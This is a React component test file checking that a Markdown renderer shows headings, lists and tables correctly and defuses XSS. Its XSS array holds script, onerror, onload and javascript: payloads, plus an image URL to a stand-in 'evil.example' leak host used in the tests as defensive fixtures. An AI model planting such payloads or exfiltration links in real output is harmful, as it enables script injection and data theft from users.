import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { Markdown } from "../../src/components/Markdown";

const XSS = [
  `<script>window.__pwned = 1</script>`,
  `<img src=x onerror="window.__pwned = 2">`,
  `[click](javascript:window.__pwned=3)`,
  `<a href="javascript:window.__pwned=4">raw</a>`,
  `![pic](https://evil.example/leak?q=secret)`,
  `<svg onload="window.__pwned=5"></svg>`,
].join("\n\n");

describe("Markdown", () => {
  it("renders GFM: headings, lists, tables, code", () => {
    const { container } = render(
      <Markdown text={"# Title\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |\n\n```python\nprint(1)\n```"} />,
    );
    expect(container.querySelector("h1")?.textContent).toBe("Title");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.querySelector("td")?.textContent).toBe("1");
    expect(container.querySelector("pre")?.textContent).toContain("print(1)");
    expect(container.textContent).toContain("copy");
  });

  it("renders XSS payloads as inert text", () => {
    const { container } = render(<Markdown text={XSS} />);
    expect(container.querySelector("script, img, svg")).toBeNull();
    for (const el of container.querySelectorAll("*")) {
      for (const attr of el.attributes) {
        expect(attr.name.startsWith("on"), `${el.tagName} ${attr.name}`).toBe(false);
        expect(attr.value).not.toMatch(/^\s*javascript:/i);
      }
    }
    expect((window as { __pwned?: number }).__pwned).toBeUndefined();
    // Raw HTML stays visible as text, so the user can see what the model sent.
    expect(container.textContent).toContain("<script>");
  });

  it("turns images into links instead of loading them", () => {
    const { container } = render(<Markdown text={"![pic](https://evil.example/leak?q=secret)"} />);
    const a = container.querySelector("a");
    expect(a?.textContent).toBe("[image: pic]");
    expect(a?.getAttribute("href")).toBe("https://evil.example/leak?q=secret");
    expect(a?.getAttribute("rel")).toContain("noopener");
  });
});
